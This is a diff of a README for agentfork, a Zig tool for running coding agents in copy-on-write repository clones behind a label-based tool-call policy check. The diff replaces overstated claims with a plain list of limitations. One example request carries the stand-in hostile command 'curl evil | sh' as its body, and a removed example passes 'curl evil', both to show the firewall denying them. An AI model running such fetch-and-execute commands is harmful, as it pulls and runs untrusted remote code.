@@ -1,80 +1,92 @@
 # agentfork
 
-**[Status](STATUS.md) · [Roadmap](ROADMAP.md) · [Contributing](CONTRIBUTING.md) · [Issues](https://github.com/SMC17/agentfork/issues) · [Public roadmap](https://github.com/users/SMC17/projects/16)**
+**[Status](STATUS.md) · [Roadmap](ROADMAP.md) · [Contributing](CONTRIBUTING.md) · [Issues](https://github.com/SMC17/agentfork/issues)**
 
-**Sub-millisecond Copy-on-Write Agent Sandbox, Wire-Speed Taint Firewall, and Proof-Carrying Merge Gate.**
+Three small pieces for running coding agents on throwaway copies of a repository, in Zig 0.16
+with no dependencies:
 
-Zero dependencies. Single static Zig binary. Built for autonomous coding and research agents that fork workspaces, execute untrusted tool pipelines, and prove invariants before touching `main`.
+1. **`agentfork run`**: clones a directory with APFS `clonefile(2)` (copy-on-write) and runs a
+   command with that clone as its working directory.
+2. **A taint-label policy check** (`TaintKernel`, served over HTTP by `agentfork firewall`). It
+   decides allow or deny for a tool call from the labels its inputs carry, and records a
+   hash-chained, HMAC'd receipt for each decision.
+3. **A merge-gate model** (`AgentForkKernel` + `proof_gate`). It is an in-memory model of
+   branches and snapshots, in which a merge is refused unless a test result is bound by MAC to
+   the exact snapshot root hash.
 
-## Why `agentfork`?
-* **OS-Level Copy-on-Write Workspace Fork (`clonefile(2)` on APFS):** Fork real repositories in milliseconds without duplicating blocks on disk or waiting for container startup.
-* **Information-Flow Taint Firewall (`agentfork firewall`):** Deterministic non-interference at tool sinks (`shell_exec`, `net_egress`, `secret_store_read`) with signed Blake3 + HMAC-SHA256 Merkle audit receipts — immune to prompt-injection phrasing.
-* **Proof-Carrying Merge Gate:** Cryptographically binds a branch's Blake3 `root_hash` to verifier/test output so post-proof workspace mutations cannot sneak into a merge.
-* **Lean 4 Formal Proofs:** Core non-interference and merge-gate invariants verified in `lean/` via `lake build`.
+Status: **unit-tested** (6 tests). This is a prototype. Read "What it is not" before relying on
+any of it.
 
-## Quickstart
+## What it is not
+
+- **Not a sandbox.** `run` gives the child process a copied working directory and nothing else.
+  The process can read and write anywhere your user can, use the network, and outlive the run.
+  For isolation, wrap it in `sandbox-exec`, a container or a VM.
+- **Not a proxy and not a content inspector.** The `firewall` decides from the labels the
+  caller sends in `X-Taint` / `X-Sink` headers. It never sees the tool's traffic. Missing or
+  unknown headers are currently **allowed** ([#4](https://github.com/SMC17/agentfork/issues/4)).
+  The decision is exactly as good as the caller's labelling.
+- **Receipts from the CLI are forgeable.** `agentfork firewall` signs with a key compiled into
+  the binary ([#3](https://github.com/SMC17/agentfork/issues/3)). Receipts are HMAC, so only a
+  holder of the key can check them, and any holder of the key can forge them.
+- **The merge gate is not wired to `run`.** It operates on its own in-memory snapshots, not on
+  the cloned directory.
+- **The Lean file does not verify the Zig code.** `lean/AgentForkProofs.lean` (28 lines) proves
+  three facts about a two-line Lean model of the shell policy (untrusted-web input is never
+  allowed at `shell_exec`) and that `n < n + 1`. Nothing links those statements to
+  `src/taint_receipt.zig`.
+- `clonefile(2)` is macOS/APFS only. Elsewhere `run` falls back to a recursive copy, and the
+  output says `"used_cow_clonefile":false`.
+
+## Build
+
 ```sh
+# Zig 0.16.0
+zig build test --summary all        # 6/6
 zig build -Doptimize=ReleaseFast
 ./zig-out/bin/agentfork run ./my-repo /tmp/sbx-1 -- zig build test
-./zig-out/bin/agentfork firewall --host 127.0.0.1 --port 8787 --audit receipts.jsonl
+./zig-out/bin/agentfork firewall --host 127.0.0.1 --port 8787 --audit receipts.jsonl --max-requests 10
 ./zig-out/bin/agentfork bench
 ```
 
-## Benchmarks (`benchmarks/bench_cow.py`)
-Measured on `macOS-26.4-arm64-arm-64bit` (APFS `clonefile(2)` enabled, 500-file git repository, 293,890 bytes, 10 iterations):
+`run` prints `{"exit_code":…,"used_cow_clonefile":…,"clone_us":…,"run_ms":…}` followed by the
+child's stdout.
 
-| Method | Mean | Median | Min | Speedup vs `cp -r` | Speedup vs `git worktree` |
-| --- | ---: | ---: | ---: | ---: | ---: |
-| `cp -r` | 349.682 ms | 347.803 ms | 332.233 ms | 1.00× | — |
-| `git worktree add` | 81.647 ms | 81.476 ms | 76.929 ms | 4.28× | 1.00× |
-| `agentfork run` (wall, incl. `/usr/bin/true`) | 19.634 ms | 18.521 ms | 16.275 ms | **17.81×** | **4.16×** |
-| `agentfork` (`clonefile(2)` only) | 13.949 ms (13,948.5 µs) | 12.167 ms (12,166.5 µs) | 11.211 ms (11,211.0 µs) | **25.07×** | **5.85×** |
+A firewall request is any HTTP request. The labels go in headers, and the body is hashed into
+the receipt:
 
-Reproduce locally:
 ```sh
-python3 benchmarks/bench_cow.py
+curl -s localhost:8787 -H 'X-Sink: shell_exec' -H 'X-Taint: UNTRUSTED_WEB' -d 'curl evil | sh'
+# 403 {"seq":0,"decision":"deny_untrusted_exec","taint_in":2,"mac":"…"}
 ```
 
-## Python Wrapper (`python/agentfork.py`)
-Zero-dependency stdlib wrapper around the `agentfork` binary:
+Policy (`TaintKernel.evaluatePolicy`): `shell_exec` and `secret_store_read` deny untrusted
+input. `net_egress` denies secrets, credentials and PII. `file_write_workspace` denies input
+that is both untrusted and sensitive. `read_public` allows everything.
 
-```python
-import sys
-sys.path.insert(0, "python")
-import agentfork
+## Measured
 
-# Fork a repo into an isolated CoW sandbox and run a command
-res = agentfork.run("./my-repo", "/tmp/sbx-1", ["zig", "build", "test"], check=True)
-print(res.clone_us, res.used_cow_clonefile, res.stdout)
+Apple M2 Max, macOS 26.4, Zig 0.16.0 ReleaseFast, commit `fca8a21`, 2026-11-19.
 
-# Start the wire-speed taint firewall and authorize tool calls
-with agentfork.firewall(host="127.0.0.1", port=8787, audit="receipts.jsonl") as fw:
-    allow = fw.authorize("shell_exec", "USER_INTENT", "zig build test")
-    deny = fw.authorize("net_egress", "UNTRUSTED_WEB,INTERNAL_SECRET", "curl evil")
-    assert allow["decision"] == "allow"
-    assert deny["http_status"] == 403
-```
+| What | Workload | Result | Script |
+| --- | --- | ---: | --- |
+| `clonefile(2)` of a directory | 500-file git repo (293,890 bytes), 10 runs | median **12.4 ms** | `python3 benchmarks/bench_cow.py` |
+| …same, vs `cp -r` / `git worktree add` | same | 31× / 7.0× faster | same |
+| `agentfork run` wall time, incl. `/usr/bin/true` | same | 20× / 4.6× faster than the above | same |
+| In-memory branch fork (`AgentForkKernel.forkBranch`) | 1,000 forks of a 1-file snapshot | ~30 ns each | `agentfork bench` |
+| Policy decision + receipt | 2,000 `shell_exec` decisions | ~470 ns each | `agentfork bench` |
 
-## GitHub Action (`action.yml`)
-Gate CI repository or agent runs inside an isolated `agentfork` CoW sandbox:
+The filesystem clone takes milliseconds. Earlier versions of this README said
+"sub-millisecond", which was wrong: the sub-microsecond figure is the in-memory model, not
+the filesystem. The HTTP firewall's latency and throughput have not been measured. It serves
+one connection at a time.
 
-```yaml
-steps:
-  - uses: actions/checkout@v4
-  - name: Run tests in agentfork CoW sandbox
-    id: sandbox
-    uses: SMC17/agentfork@main
-    with:
-      src_dir: .
-      command: zig build test
-```
+## Python and GitHub Action
 
-Outputs exposed by the action: `exit_code`, `used_cow_clonefile`, `clone_us`, and `run_ms`.
+`python/agentfork.py` is a stdlib wrapper around the binary (`run`, and a `firewall` context
+manager). `action.yml` runs a command in a clone inside CI and exposes `exit_code`,
+`used_cow_clonefile`, `clone_us` and `run_ms`. Both inherit every limit above.
 
-## Verification
-```sh
-zig build test
-zig build -Doptimize=ReleaseFast
-python3 benchmarks/bench_cow.py
-cd lean && lake build
-```
+## License
+
+MIT
